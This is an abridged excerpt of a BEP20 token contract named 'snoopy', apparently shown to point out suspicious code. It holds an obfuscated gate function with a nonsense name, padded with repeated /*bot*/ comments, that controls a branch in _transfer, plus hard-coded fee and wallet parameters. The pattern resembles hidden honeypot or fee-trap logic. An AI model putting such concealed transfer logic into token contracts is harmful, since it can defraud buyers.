...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function iwhfiannponfwn23(address wdsawdwd, address rfaecpien) internal view returns (bool){/*bot*//*bot*//*bot*//*bot*/
        return /*bot*/ /*bot*/ /*bot*/ /*bot*/ /*bot*/ /*bot*/ /*bot*/isExcludedFromCut[wdsawdwd] == false 
        /*bot*//*bot*/|| /*bot*//*bot*//*bot*//*bot*/(wdsawdwd /*bot*/!= rfaecpien) ;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(iwhfiannponfwn23(sender,recipient))
...
contract snoopy is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(6),uint256(0)],
        [uint256(1),uint256(10),uint256(0)],
        [uint256(100000000000000),uint256(100000000000000)],
        [0x75782acAfb64542aB6032AEFc6FB3EAd6D900Ebb,0x75782acAfb64542aB6032AEFc6FB3EAd6D900Ebb],
        0x5426f9663c42435D8964638F4eC7217ee75eF123
    ){}
}